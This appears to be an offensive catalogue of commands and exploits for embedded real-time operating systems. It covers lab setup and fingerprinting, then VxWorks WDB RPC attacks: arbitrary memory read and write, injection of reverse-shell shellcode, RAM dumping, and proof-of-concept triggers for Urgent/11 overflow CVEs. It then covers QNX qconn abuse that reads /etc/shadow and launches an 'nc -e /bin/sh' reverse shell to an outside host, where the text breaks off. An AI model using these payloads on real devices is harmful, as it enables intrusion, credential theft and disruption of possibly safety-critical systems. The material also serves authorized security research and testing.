# Embedded RTOS Security Payloads / Command & Exploit Catalogue

> Companion to `SKILL.md`. Every command is reproducible on Kali Linux 2025-2 after the per-tool install steps in §1.
>
> Placeholder convention: `<target-ip>` is the RTOS device IP, `<target-port>` is the debug agent port (17185/8000/3333), `<swd-clk>` is the SWD clock in Hz, `<firmware.bin>` is the extracted RTOS image, `<dbc>` is an RTOS symbol table. Replace before running.
>
> **CRITICAL SAFETY NOTE**: Many of the techniques below (WDB RPC memory write, OTA patch, secure boot glitch) cause irreversible changes to the target device. Always test against a bench unit first. Some commands (DHCP exhaustion, ICMP-based heap overflow, Bluetooth fuzz) are illegal in most jurisdictions without explicit authorization from the device owner AND the network operator. RTOS devices in safety-critical environments (avionics, automotive, medical, industrial) carry additional regulatory and liability considerations — see `test-cases.md` for the engagement scope required per test case.

---

## Table of Contents

1. Lab Setup — Toolchain Installation (VxWorks / FreeRTOS / Zephyr / ThreadX / QNX)
2. RTOS Fingerprinting & Identification (network, binary, hardware)
3. VxWorks — WDB RPC Protocol, WIND IP Stack, Urgent/11 CVEs
4. QNX Neutrino — Qnet, qconn, procfs, Momentics
5. FreeRTOS — FreeRTOS+TCP CVEs, Task Corruption, Heap Overflow
6. ThreadX / Azure RTOS — Block Pool, NetX DUO, OpenAMP
7. Zephyr — Kconfig, Bluetooth Host, Networking Subsystem
8. Mbed OS — uVisor, Pelion, mbedTLS
9. TI-RTOS / SYS/BIOS — NDK, ROV, XDC Tools
10. MicroC/OS, NuttX, RIOT, Contiki-NG
11. Hardware Attack Methods — JTAG, SWD, UART, Glitching, Side-Channel
12. Software Methods — Debug Agent, MPU Bypass, Heap Corruption, Scheduler
13. Emulation & Symbolic Execution — Renode, QEMU, angr
14. Defensive Verification — MPU, Stack Canaries, Secure Boot

---

## 1. Lab Setup — Toolchain Installation

```bash
# ─── Reverse engineering toolchain ───
sudo apt-get install -y radare2 valgrind binutils-arm-none-eabi gcc-arm-none-eabi gdb-multiarch
pip3 install --user capstone keystone-engine unicorn
# Ghidra (NSA) — install manually from https://ghidra-sre.org/
# IDA Pro (Hex-Rays) — commercial, install per license
# Binary Ninja — commercial, install per license

# ─── OpenOCD (open on-chip debugger, JTAG/SWD) ───
sudo apt-get install -y openocd
openocd --version
# OpenOCD 0.12.0 or later required for Cortex-M33/M55 (ARMv8-M)

# ─── Hardware probe drivers ───
# J-Link (Segger) — install from https://www.segger.com/downloads/jlink/
# After install:
JLinkExe --version

# ST-Link — comes with openocd; for the standalone tool:
sudo apt-get install -y stlink-tools
st-flash --version

# Black Magic Probe — native GDB server, appears as /dev/ttyACM0 (GDB) + /dev/ttyACM1 (UART)
ls /dev/ttyACM*

# JTAGulator — serial-over-USB; use screen or picocom
sudo apt-get install -y picocom
picocom -b 115200 /dev/ttyUSB0

# Shikra — FT2232H-based; supported by OpenOCD as interface/ftdi/jtagkey.cfg
cat > /etc/openocd/shikra.cfg <<EOF
adapter driver ftdi
ftdi_device_desc "Shikra"
ftdi_vid_pid 0x0403 0x6010
ftdi_layout_init 0x0008 0x000b
transport select jtag
EOF

# ─── Firmware analysis ───
sudo apt-get install -y binwalk
pip3 install --user unblob
sudo apt-get install -y sasquatch jefferson cramfsswap squashfs-tools ubi-utils
# firmwalker
git clone https://github.com/craigz28/firmwalker.git ~/tools/firmwalker
# FACT (Firmware Analysis and Comparison Tool)
docker run -p 5000:5000 -it factcore/fact-core

# ─── Emulation ───
sudo apt-get install -y qemu-system-arm qemu-system-mips qemu-user
pip3 install --user angr
# Renode — install manually from https://renode.io/
wget https://github.com/renode/renode/releases/latest/download/renode-*.pkg
sudo dpkg -i renode-*.pkg
renode --version

# ─── ChipWhisperer (NewAE) ───
pip3 install --user chipwhisperer
python3 -c "import chipwhisperer; print(chipwhisperer.__version__)"
# Capture board drivers:
# Linux: udev rule for NewAE CW308/CW1173/CW Lite/Nano

# ─── GreatFET / HydraBus / Bus Pirate ───
# GreatFET
pip3 install --user greatfet
sudo apt-get install -y libgreat-dev
greatfet info

# HydraBus — bare USB device, use hydra.py
git clone https://github.com/hydrabus/hydrafw.git ~/tools/hydrafw

# Bus Pirate — PIC-based, appears as /dev/ttyUSB0
picocom -b 115200 /dev/ttyUSB0
# Then: m (mode menu) -> 3 (SPI) or 1 (UART) etc.

# ─── flashrom ───
sudo apt-get install -y flashrom
flashrom --version
# Programmers: ch341a_spi, dediprog, buspirate_spi, serprog, linux_spi

# ─── RTOS-specific toolchains (for building PoCs / target images) ───
# FreeRTOS
git clone https://github.com/FreeRTOS/FreeRTOS.git ~/tools/FreeRTOS
# Zephyr
pip3 install --user west
west init ~/tools/zephyrproject
cd ~/tools/zephyrproject && west update
# ThreadX / Azure RTOS (Eclipse)
git clone https://github.com/eclipse-threadx/threadx.git ~/tools/threadx
# RIOT
git clone https://github.com/RIOT-OS/RIOT.git ~/tools/RIOT
# NuttX
git clone https://github.com/apache/nuttx.git ~/tools/nuttx
git clone https://github.com/apache/nuttx-apps.git ~/tools/nuttx-apps
# Contiki-NG
git clone https://github.com/contiki-ng/contiki-ng.git ~/tools/contiki-ng
```

### VxWorks-specific toolchain

```bash
# VxWorks is proprietary (Wind River). Two paths to a buildable image:
# (a) Trial Workbench from Wind River (registration required)
# (b) VxWorks SDK / VxWorks 7 on Yocto (open-source kernel module layer)
git clone https://github.com/WindRiver-Labs/vxworks7-sdk.git ~/tools/vxworks7-sdk
cd ~/tools/vxworks7-sdk && ./wr-vxworks/bsps/rpi_vb.build.sh

# WDB RPC client (python)
pip3 install --user pwntools struct-pack
git clone https://github.com/dark-lbp/vxworks_wdb.git ~/tools/vxworks_wdb
# Reference: https://github.com/dark-lbp/vxworks_wdb
# Author's writeup: https://www.arp339.com/posts/vxworks-wdb-protocol/
```

### FreeRTOS-specific toolchain

```bash
# FreeRTOS+TCP source (the vulnerable stack)
git clone https://github.com/FreeRTOS/FreeRTOS-Plus.git ~/tools/FreeRTOS-Plus
cd ~/tools/FreeRTOS-Plus/Source/FreeRTOS-Plus-TCP
# Build for a host POSIX simulator
make -C build/posix

# Zimperium PoCs (free reference)
git clone https://github.com/Zimperium/freertostcp_pocs.git ~/tools/freertostcp_pocs
# Contains: CVE-2018-16525 (IP fragment UAF), CVE-2018-16528 (ICMP heap overflow),
# CVE-2018-16529 (DF flag), CVE-2018-16603 (TCP SYN exhaustion)
```

### Zephyr-specific toolchain

```bash
cd ~/tools/zephyrproject/zephyr
# Build for a QEMU target (Cortex-M)
west build -b qemu_cortex_m3 samples/hello_world
west build -t run
# Build for native_posix (Linux process — useful for fuzzing)
west build -b native_posix samples/hello_world
./build/zephyr/zephyr.elf

# Bluetooth test vectors
git clone https://github.com/zephyrproject-rtos/zephyr-bluetooth-test.git
```

---

## 2. RTOS Fingerprinting & Identification

### Network-based fingerprinting

```bash
# ─── VxWorks WDB agent — UDP 17185 ───
# The WDB agent responds to a "MODE_ANY" probe even without authentication
nmap -sU -p 17185 --script=vxworks-wdb <target-ip>
# Manual probe via Python (builds a WDB RPC MODE_ANY packet)
python3 << 'EOF'
import socket, struct
# WDB RPC header: RPC version 2, program 0x55555555 (WDB), version 1, procedure 1 (MODE_ANY)
# Reference: Wind River WDB RPC specification
def wdb_probe(ip, port=17185):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(2.0)
    # RPC call: program=0x55555555, proc=1, vers=1, xid=0x12345678
    rpc = struct.pack('>IIIIIIIIII',
                      0x12345678,  # xid
                      0,           # type (CALL)
                      2,           # rpc version
                      0x10000000 | 0x55555555,  # program (WDB)
                      1,           # version
                      1,           # procedure (MODE_ANY)
                      0, 0,         # auth (NULL)
                      0, 0)         # verifier (NULL)
    s.sendto(rpc, (ip, port))
    try:
        data, _ = s.recvfrom(4096)
        print(f"[+] WDB response from {ip}:17185 — {data.hex()}")
        # A valid response has the same xid and a reply type (1)
        xid = struct.unpack('>I', data[:4])[0]
        reply = struct.unpack('>I', data[4:8])[0]
        print(f"    xid=0x{xid:08x} reply_type={reply}")
    except socket.timeout:
        print(f"[-] No WDB response from {ip}:17185")
    s.close()

wdb_probe('192.168.1.10')
EOF

# ─── QNX qconn — TCP 8000 ───
# The qconn service announces itself with a banner on connect
nc <target-ip> 8000
# Expected banner: "QCONN" or qconn version string
# Fingerprint via nmap
nmap -sV -p 8000 --script=qconn-fingerprint <target-ip>

# ─── FreeRTOS TCP/IP stack fingerprint ───
# DHCP option 60 (vendor class identifier)
# Many FreeRTOS ports set this to "FreeRTOS" or "rtos"
dhcpig -i eth0 --target <target-ip> --option-60 "FreeRTOS"
# TCP/IP timing fingerprint
nmap -sV -O -p 80,23,22 <target-ip>
# Look for the "FreeRTOS+TCP" service in the version string

# ─── Zephyr Bluetooth host fingerprint ───
# hcitool / bluetoothctl
sudo hcitool -i hci0 lescan
# Then connect and read the device name / appearance
sudo bluetoothctl
[bluetooth]# scan on
[bluetooth]# connect <bdaddr>
[NEW] Device <bdaddr> ZephyrSample
# HCI vendor: Zephyr uses 0x0F (Realtek SEM) or custom 0xFFFF depending on build

# ─── TI-RTOS ROV (Runtime Object Viewer) over UART ───
# ROV is exposed via the XDCtools console
# Connect UART, look for:
#   *** XDC Tools Console ***
#   Type 'help' for a list of commands
picocom -b 115200 /dev/ttyUSB0
# Then: help, list, taskShow, heapShow

# ─── Generic IP/UDP banner sweep ───
nmap -sU --top-ports=100 -sV <target-ip>
nmap -sT -p 1-65535 --min-rate=5000 <target-ip>
```

### Binary-based fingerprinting (after firmware extraction)

```bash
# ─── Look for RTOS-specific strings ───
binwalk -e firmware.bin
cd _firmware.bin.extracted/

# VxWorks
strings -a ./vxWorks | grep -E "(VxWorks|Wind River|WDB|wdb|tgtPing)" | head -20
# Common VxWorks version strings:
#   VxWorks (for ...) version 5.5.1.
#   VxWorks 6.9.4.1 kernel
#   VxWorks (Wind River Systems, Inc.)
#   WDB: WIND Debug Agent
#   WDB: Ready

# FreeRTOS
strings -a ./freertos_image.bin | grep -E "(FreeRTOS|vTask|pvPortMalloc|vPortFree|TCB_t)" | head -20
#   FreeRTOS V10.4.3
#   Copyright (C) 2020 Amazon.com, Inc. or its affiliates.
#   vTaskStartScheduler
#   pvPortMalloc

# ThreadX / Azure RTOS
strings -a ./threadx_image.bin | grep -E "(ThreadX|tx_thread|tx_byte_pool|Azure RTOS|NetX)" | head -20
#   ThreadX 6.1.10
#   Copyright (c) Microsoft Corporation
#   Azure RTOS ThreadX

# Zephyr
strings -a ./zephyr_image.bin | grep -E "(Zephyr|z_.*_init|k_thread|Kconfig)" | head -20
#   Zephyr Project
#   Zephyr version 3.5.0
#   Booting Zephyr OS

# QNX Neutrino
strings -a ./qnx_image.bin | grep -E "(QNX|Neutrino|procnto|qconn|io-pkt|momentics)" | head -20
#   QNX Neutrino 7.1
#   procnto-smp-instr
#   QNX Software Systems

# MicroC/OS-II
strings -a ./ucos_image.bin | grep -E "(MicroC|OS_|OSTaskCreate|uC/OS)" | head -20
#   uC/OS-II v2.92
#   OSTaskCreate

# NuttX
strings -a ./nuttx_image.bin | grep -E "(NuttX|nuttx|nx_start|up_initialize)" | head -20
#   NuttX-12.3.0
#   Booting NuttX

# RIOT OS
strings -a ./riot_image.bin | grep -E "(RIOT|riot_init|gnrc_|sysinit)" | head -20
#   RIOT OS
#   main(): This is RIOT!

# Contiki-NG
strings -a ./contiki_image.bin | grep -E "(Contiki|process_thread|uIP|6LoWPAN)" | head -20
#   Contiki-NG
#   Starting Contiki-NG

# Mbed OS
strings -a ./mbed_image.bin | grep -E "(Mbed|mbed|uVisor|Pelion|mbedTLS)" | head -20
#   Mbed OS 5.15
#   ARM mbed

# TI-RTOS
strings -a ./tirtos_image.bin | grep -E "(TI-RTOS|SYS/BIOS|XDC|xdc_|ti_sysbios|ti_ndk)" | head -20
#   TI-RTOS 2.16
#   SYS/BIOS 6.76
```

### Hardware-based fingerprinting (JTAG/SWD scan)

```bash
# ─── JTAGulator — pin enumeration ───
# Connect JTAGulator to the target PCBA's unknown pins
picocom -b 115200 /dev/ttyUSB0
# At the JTAGulator prompt:
# > j (JTAG enumeration)
# > Number of pins to scan: 24
# > Starting pin: 0
# Result example:
#   TCK = 0
#   TDI = 1
#   TDO = 2
#   TMS = 3
#   Device IDCODE: 0x4BA00477 (ARM Cortex-M4 with SW-DP)
#   Device IR length: 4

# ─── OpenOCD auto-detect ───
# Once pinout is known, write a config file
cat > /tmp/target_jtag.cfg <<EOF
adapter driver ftdi
ftdi_vid_pid 0x0403 0x6010
ftdi_layout_init 0x0008 0x000b
transport select jtag
jtag newtap target chip -expected-id 0x4BA00477 -irlen 4
EOF
openocd -f /tmp/target_jtag.cfg

# ─── Shikra / FT2232H SWD scan ───
cat > /tmp/target_swd.cfg <<EOF
adapter driver ftdi
ftdi_vid_pid 0x0403 0x6010
ftdi_layout_init 0x0018 0x001b
transport select swd
swd newdap target chip -irlen 2 -expected-id 0x2BA01477
EOF
openocd -f /tmp/target_swd.cfg -c 'init; targets; resume'

# ─── Bus Pirate UART discovery ───
# Connect BP to two candidate UART pins
picocom -b 115200 /dev/ttyUSB0
# Mode menu: m
# Select: 3 (UART)
# Speed: 9600, 38400, 57600, 115200 — try each
# Bit per byte: 8
# Parity: none
# Stop bit: 1
# Receive: H (Hi-Z)
# Then watch for ASCII boot logs

# ─── GreatFET SWD ───
greatfet swd -e 0x2BA01477
# GreatFET acts as a SWD interface; supports probe, attach, dump
```

---

## 3. VxWorks — WDB RPC Protocol, WIND IP Stack, Urgent/11 CVEs

### WDB RPC protocol structure

```python
# WDB (Wind River Debug Agent) RPC protocol
# Reference: Wind River WDB RPC specification
# Transport: UDP 17185 (default), TCP 17185 (alternative)
# Authentication: WDB_MODE_ANY (no auth, default on VxWorks <= 6.9.3) / WDB_MODE_TASK (task creds)

# RPC packet structure (XDR-encoded):
# - xid (uint32)        — transaction id
# - msg_type (uint32)   — 0=CALL, 1=REPLY
# - rpc_version (uint32)— always 2
# - program (uint32)    — 0x55555555 (WDB)
# - version (uint32)    — 1
# - procedure (uint32)  — see table
# - auth (opaque)       — 0-length for NULL auth
# - verifier (opaque)   — 0-length for NULL auth

# Procedure table:
# 0  NULL        (no-op)
# 1  MODE_ANY    (probe, no auth required)
# 2  MODE_TASK   (probe, requires task creds)
# 3  CTXT_ATTACH (attach to a context)
# 4  CTXT_KILL   (kill a context)
# 5  CTXT_CONT   (continue context)
# 6  CTXT_STEP   (single-step context)
# 7  CTXT_READ   (read memory in context)  <-- UNAUTH READ in MODE_ANY
# 8  CTXT_WRITE  (write memory in context) <-- UNAUTH WRITE in MODE_ANY
# 9  REG_READ    (read CPU registers)
# 10 REG_WRITE   (write CPU registers)
# 11 TASK_SPAWN  (spawn a new task)        <-- UNAUTH SPAWN in MODE_ANY
# 12 TASK_KILL
# ...
# 21 TGT_PING    (ping target)
# 22 TGT_INFO    (target info: VxWorks version, BSP, CPU)

# Build a tgt_ping packet
import socket, struct

def wdb_tgt_ping(target_ip, port=17185):
    xid = 0xCAFEBABE
    rpc_call = struct.pack('>IIIIIIIIII',
        xid, 0, 2,           # xid, CALL, RPC version 2
        0x55555555, 1, 21,   # WDB program, version 1, procedure 21 (TGT_PING)
        0, 0, 0, 0           # NULL auth, NULL verifier
    )
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(2.0)
    s.sendto(rpc_call, (target_ip, port))
    try:
        data, _ = s.recvfrom(4096)
        if struct.unpack('>I', data[4:8])[0] == 1:  # REPLY
            print(f"[+] {target_ip}: WDB TGT_PING successful (VxWorks present)")
            return True
    except socket.timeout:
        print(f"[-] {target_ip}: no WDB response")
    return False

wdb_tgt_ping('192.168.1.10')
```

### WDB agent — full target information dump

```python
import socket, struct, sys

def wdb_call(target_ip, proc, payload=b'', port=17185):
    """Send a WDB RPC call and return the reply payload."""
    xid = 0xDEADBEEF
    rpc = struct.pack('>IIIIIIIIII',
        xid, 0, 2,
        0x55555555, 1, proc,
        0, 0, 0, 0) + payload
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(2.0)
    s.sendto(rpc, (target_ip, port))
    try:
        data, _ = s.recvfrom(65535)
        reply_xid = struct.unpack('>I', data[:4])[0]
        reply_type = struct.unpack('>I', data[4:8])[0]
        reply_state = struct.unpack('>I', data[8:12])[0] if len(data) >= 12 else None
        return data[12:] if reply_type == 1 else None
    except socket.timeout:
        return None

# TGT_INFO (procedure 22): returns WDB_RT_INFO with:
#   rtType (1=VXWORKS, 2=LINUX, 3=INTEGRITY)
#   rtVersion (string)
#   rtBspName (string)
#   rtCpuType (ARM, MIPS, PPC, etc.)
info = wdb_call('192.168.1.10', 22)
if info:
    print(f"[+] TGT_INFO reply ({len(info)} bytes): {info[:128].hex()}")
    # Parse XDR-encoded strings to extract version, BSP name
    # (Manual parsing — see VXWORKS RPC spec for exact format)
```

### WDB agent — arbitrary memory read (CVE-worthy primitive)

```python
# CTXT_READ (procedure 7) — read arbitrary memory in WDB_MODE_ANY
# This is the most powerful unauthenticated primitive in WDB
# Returns raw bytes from any virtual address
#
# The vulnerability: on VxWorks <= 6.9.3, WDB_MODE_ANY is the DEFAULT
# and accepts NULL auth, allowing unauthenticated memory read
#
# Reference: JSOF Urgent/11 advisory (CVE-2019-12256 et al.)
# https://www.jsof-tech.com/urgent11/

def wdb_read_mem(target_ip, addr, length=256):
    """Read arbitrary memory via WDB CTXT_READ."""
    # CTXT_READ arguments (XDR-encoded):
    #   context_id (uint32) — 0 = system context
    #   address (uint32)
    #   length (uint32)
    payload = struct.pack('>III', 0, addr, length)
    reply = wdb_call(target_ip, 7, payload)
    if reply:
        # The reply contains the raw bytes
        print(f"[+] Read {length} bytes from 0x{addr:08x}:")
        print(reply.hex())
        return reply
    return None

# Read the VxWorks system banner (typically at a known address in the BSP)
# Example: STM32F4 VxWorks BSP loads banner at 0x08008000
mem = wdb_read_mem('192.168.1.10', 0x08008000, 256)
if mem:
    print(mem.decode('ascii', errors='replace'))
```

### WDB agent — arbitrary memory write

```python
# CTXT_WRITE (procedure 8) — write arbitrary memory in WDB_MODE_ANY
# Used for: patching a function pointer, injecting shellcode, modifying a task's TCB

def wdb_write_mem(target_ip, addr, data):
    """Write arbitrary memory via WDB CTXT_WRITE."""
    # CTXT_WRITE arguments:
    #   context_id (uint32)
    #   address (uint32)
    #   length (uint32)
    #   data (length bytes, padded to 4-byte alignment)
    pad = (4 - len(data) % 4) % 4
    payload = struct.pack('>III', 0, addr, len(data)) + data + b'\x00' * pad
    return wdb_call(target_ip, 8, payload)

# Spawn a task via injected shellcode (e.g., a reverse shell)
# Step 1: write the shellcode to a known address
shellcode = bytes.fromhex(
    # ARM Cortex-M thumb-2 reverse shell (illustrative)
    '... actual bytes here ...'
)
wdb_write_mem('192.168.1.10', 0x20000000, shellcode)

# Step 2: spawn a task that calls the shellcode
# TASK_SPAWN (procedure 11)
def wdb_task_spawn(target_ip, entry_point, stack_size=4096, priority=100, name=b'revshell'):
    """Spawn a task with given entry point."""
    name_padded = name + b'\x00' * (32 - len(name))
    payload = (
        name_padded +
        struct.pack('>I', entry_point) +     # entry
        struct.pack('>I', priority) +        # priority
        struct.pack('>I', 0) +               # options
        struct.pack('>I', stack_size) +      # stack
        struct.pack('>I', 0)                 # stack addr (auto)
    )
    return wdb_call(target_ip, 11, payload)

# Spawn the reverse shell
wdb_task_spawn('192.168.1.10', 0x20000000 | 1)  # |1 for thumb mode on Cortex-M
```

### Urgent/11 — CVE-2019-12256 (WDB RPC stack overflow)

```python
# CVE-2019-12256: Stack-based buffer overflow in the WDB RPC parser
# (wdbDbgArchLib.c) when handling a malformed RPC payload.
# Triggered EVEN with WDB disabled on some VxWorks 6.x builds (because
# the parser runs before the auth check).
#
# Affected: VxWorks 6.5 - 6.9.x (prior to 6.9.4.1), VxWorks 7 (prior to SR0600)
#
# PoC: oversized RPC payload triggers the overflow

import socket

def trigger_cve_2019_12256(target_ip, port=17185):
    """Send an oversized WDB RPC packet to trigger CVE-2019-12256."""
    # The vulnerable code path: wdbDbgArchLib.c parses a long string
    # into a fixed-size stack buffer (size depends on BSP, typically 256-512 bytes)
    overflow_size = 2048
    payload = b'A' * overflow_size
    # Wrap in a malformed WDB RPC call
    rpc_packet = b'\x00' * 40 + payload
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(rpc_packet, (target_ip, port))
    print(f"[*] CVE-2019-12256 trigger sent ({overflow_size} bytes)")

# IMPORTANT: this PoC will crash the WDB agent on a vulnerable device.
# Use only against a bench device. Use angr to find the exact overflow
# offset for a reliable ROP chain — see payloads.md §13 (angr).
```

### Urgent/11 — CVE-2019-12258 (memory pool allocator overflow)

```python
# CVE-2019-12258: Memory pool allocator overflow in memPartAlloc.
# Triggered by a long string passed to a memory-allocation wrapper.
# Result: heap corruption in the WIND IP stack's pool.
#
# PoC requires a service that calls memPartAlloc with attacker-controlled
# length — typically the DNS resolver, DHCP client, or TFTP client.

# Example: oversized DHCP hostname option
import struct, socket, fcntl, struct as s

def dhcp_hostname_overflow(target_mac, target_ip_hint='192.168.1.10'):
    """Send a DHCP DISCOVER with an oversized hostname option to trigger
    CVE-2019-12258 in the VxWorks DHCP client."""
    # DHCP DISCOVER with option 12 (hostname) = 4096 bytes
    hostname = b'A' * 4096
    packet = (
        b'\x01'                          # BOOTREQUEST
        b'\x01\x06'                      # Ethernet, 6-byte MAC
        b'\x00' * 6                      # Transaction ID, seconds, flags
        + b'\x00\x00\x00\x00' * 4        # ciaddr, yiaddr, siaddr, giaddr
        + bytes.fromhex(target_mac.replace(':', '')) + b'\x00' * 10  # chaddr
        + b'\x00' * 64                    # sname (server hostname)
        + b'\x00' * 128                   # file
        + b'\x63\x82\x53\x63'             # magic cookie (DHCP)
        + b'\x35\x01\x01'                 # option 53: DHCP DISCOVER
        + b'\x0c' + bytes([len(hostname)]) + hostname  # option 12: hostname
        + b'\xff'                          # option 255: END
    )
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    s.sendto(packet, ('255.255.255.255', 67))
    print(f"[*] DHCP hostname overflow (CVE-2019-12258) sent ({len(hostname)} bytes)")

# Run against a bench VxWorks device
dhcp_hostname_overflow('aa:bb:cc:dd:ee:ff')
```

### Urgent/11 — CVE-2019-12260 (DHCPv4 client buffer overflow)

```python
# CVE-2019-12260: Buffer overflow in the VxWorks DHCPv4 client's
# dhcpClientOptionGet when handling oversized DHCP options.
# Triggered by a malicious DHCP OFFER or ACK.

# Build a malicious DHCP OFFER (server-side PoC)
def dhcp_offer_overflow(target_mac, yiaddr='192.168.1.100'):
    """Respond to a DHCP DISCOVER with an oversized OFFER to trigger
    CVE-2019-12260 in the VxWorks DHCP client."""
    oversized_option = b'B' * 1024  # option 119 (domain search list)
    packet = (
        b'\x02'                          # BOOTREPLY
        b'\x01\x06'                      # Ethernet, 6-byte MAC
        + b'\x12\x34\x56\x78'            # transaction ID (must match DISCOVER)
        + b'\x00\x00\x00\x00'            # seconds, flags
        + b'\x00\x00\x00\x00'            # ciaddr
        + socket.inet_aton(yiaddr)        # yiaddr (assigned address)
        + socket.inet_aton('192.168.1.1') # siaddr (server address)
        + b'\x00\x00\x00\x00'            # giaddr
        + bytes.fromhex(target_mac.replace(':', '')) + b'\x00' * 10
        + b'\x00' * 64                    # sname
        + b'\x00' * 128                   # file
        + b'\x63\x82\x53\x63'             # magic cookie
        + b'\x35\x01\x02'                 # option 53: OFFER
        + b'\x36\x04' + socket.inet_aton('192.168.1.1')  # server identifier
        + b'\x77' + bytes([len(oversized_option)]) + oversized_option  # option 119: domain search (oversized)
        + b'\xff'
    )
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(('0.0.0.0', 67))
    s.sendto(packet, (yiaddr, 68))
    print(f"[*] DHCP OFFER with oversized option 119 sent to {yiaddr}")

# NOTE: this requires root (port 67) and will likely break DHCP for the
# entire segment. Use only in a lab environment.
```

### Urgent/11 — CVE-2019-12264 (TCP urgent pointer)

```python
# CVE-2019-12264: TCP urgent pointer (OOB data) handling flaw in the
# VxWorks WIND IP stack's TCP/IP state machine.
# Triggered by a malformed TCP segment with the URG flag set and
# an urgent pointer pointing beyond the segment boundary.
#
# PoC using Scapy

from scapy.all import IP, TCP, send

def tcp_urg_overflow(target_ip, target_port=23):
    """Send a TCP segment with malformed URG pointer to trigger CVE-2019-12264."""
    pkt = IP(dst=target_ip) / TCP(
        sport=31337,
        dport=target_port,
        flags='PAU',  # PSH + ACK + URG
        seq=100,
        urgptr=65535,  # Maximum urgent pointer — exceeds segment size
    ) / b'X' * 100
    send(pkt)
    print(f"[*] TCP URG pointer overflow (CVE-2019-12264) sent to {target_ip}:{target_port}")

tcp_urg_overflow('192.168.1.10', 23)
```

### VxWorks — full memory dump via WDB

```python
# Full RAM dump via WDB CTXT_READ — useful for offline analysis
# Useful when JTAG is locked down but UDP 17185 is open
import struct

def dump_vxworks_ram(target_ip, start_addr=0x00000000, end_addr=0x00400000, block=512):
    """Dump target RAM via WDB CTXT_READ."""
    dumped = 0
    with open(f'{target_ip}_ram.bin', 'wb') as f:
        for addr in range(start_addr, end_addr, block):
            data = wdb_read_mem(target_ip, addr, block)
            if data:
                # Pad to expected length (WDB may return fewer bytes if addr invalid)
                if len(data) < block:
                    data = data + b'\x00' * (block - len(data))
                f.write(data)
                dumped += block
                if dumped % 0x10000 == 0:
                    print(f"    Progress: 0x{addr:08x} / 0x{end_addr:08x}")
    print(f"[+] Dumped {dumped} bytes to {target_ip}_ram.bin")

# Dump the first 4MB of RAM (where VxWorks kernel + TCBs usually live)
dump_vxworks_ram('192.168.1.10', 0x00000000, 0x00400000)
```

### VxWorks — extracting the symbol table

```bash
# VxWorks ships a symbol table (vxWorks.sym) that maps symbol names to addresses.
# Often found in the firmware filesystem, but can also be retrieved via WDB.

# From a firmware image:
strings -a firmware.bin | grep -E "^[0-9a-f]{8} [tTbBdD] " | head -50
# Format: <addr> <type> <name>
# Example:
#   00102400 t usrInit
#   001026a0 t usrAppInit
#   00102800 T vxbDevInit
#   00102c00 T wdbDbgArchLibInit

# Use Ghidra to load symbols
# Ghidra > File > Import Program > vxworks_image.bin
# In the loader dialog:
#   Language: ARM:LE:32:Cortex (or MIPS, PowerPC depending on CPU)
#   Loader options: VxWorks symbol table address = 0x00102400

# Or via IDA Pro:
# File > Open > vxworks_image.bin
# Processor: ARM Little Endian
# Loading offset: 0x0
# Then: File > Script file > load_vxworks_symbols.py
```

---

## 4. QNX Neutrino — Qnet, qconn, procfs, Momentics

### QNX Neutrino architecture

```text
QNX Neutrino is a microkernel (POSIX.1e-compliant). Kernel runs in supervisor mode;
all OS services (process manager, file systems, network, drivers) run as user-space
processes communicating via synchronous message passing (MsgSend/MsgReceive).

Key components:
- procnto (or procnto-smp-instr): the kernel + process manager combined
- io-pkt* (or io-pkt-v6-hc): the network stack (network manager process)
- devc-* : character device drivers
- devb-* : block device drivers
- mqueue: POSIX message queues
- qconn: QConnect service (TCP 8000) — Momentics IDE remote attach
- qnet (Qnet): QNX-native protocol over Ethernet, QNX machine-to-machine IPC

Attack surface:
- qconn (TCP 8000): IDE remote attach — often misconfigured with weak auth
- Qnet (TCP/UDP 4000): QNX-native IPC — assumes trusted network
- procfs (/proc/<pid>/as): arbitrary process memory access — requires credentials
- io-pkt: BSD-derivative TCP/IP stack — BSD-origin CVEs apply
- Photon/PhAB GUI: graphical subsystem — older versions have known vulnerabilities
```

### qconn — fingerprint and authentication bypass

```bash
# qconn is a TCP server on port 8000. Its protocol is "QConnect".
# Reference: BlackBerry QNX documentation, qconn man page

# Basic connect:
nc <target-ip> 8000
# Default behavior: prints "QCONN" and expects a JSON command
# Send a service_list command:
echo '{"service":"launcher","cmd":"list"}' | nc -w 3 <target-ip> 8000
# Default qconn configuration (qconn.cfg) requires authentication only for
# certain commands (e.g., process_start). On QNX 6.5 and earlier dev images,
# ALL commands are unauthenticated.

# Fingerprint:
nmap -sV -p 8000 --script=qconn-version <target-ip>

# Service enumeration (unauthenticated on older QNX):
echo '{"service":"launcher","cmd":"list"}' | nc -w 3 <target-ip> 8000
# Typical response:
# {
#   "services": [
#     {"name":"pdebug", "port":8000, "version":"1.0"},
#     {"name":"qconnect", "port":8001, "version":"1.0"},
#     {"name":"slinger", "port":8080, "version":"1.0"},
#     ...
#   ]
# }

# Launch a process via qconn (UNAUTH on older QNX):
echo '{"service":"launcher","cmd":"launch","program":"/bin/sh","argv":["-c","id"]}' \
    | nc -w 3 <target-ip> 8000
# Output: {"exit_code":0,"output":"uid=0(root) gid=0(root)\n"}
```

### qconn — Python exploit skeleton

```python
import socket, json

def qconn_cmd(target_ip, cmd_dict, port=8000):
    """Send a JSON command to qconn and return the response."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5.0)
    s.connect((target_ip, port))
    banner = s.recv(1024)
    print(f"[*] qconn banner: {banner.strip().decode()}")
    payload = json.dumps(cmd_dict) + '\n'
    s.sendall(payload.encode())
    response = b''
    while True:
        try:
            chunk = s.recv(4096)
            if not chunk:
                break
            response += chunk
        except socket.timeout:
            break
    s.close()
    return response.decode()

# Enumerate services
print(qconn_cmd('192.168.1.20', {'service':'launcher', 'cmd':'list'}))

# Read /etc/shadow via launch
cmd = {
    'service': 'launcher',
    'cmd': 'launch',
    'program': '/bin/cat',
    'argv': ['/etc/shadow']
}
print(qconn_cmd('192.168.1.20', cmd))

# Spawn a reverse shell (if /bin/sh exists and qconn allows it)
cmd = {
    'service': 'launcher',
    'cmd': 'launch',
    'program': '/bin/sh',
    'argv': ['-c', 'nc -e /bin/sh 192.168.1.100 4444']
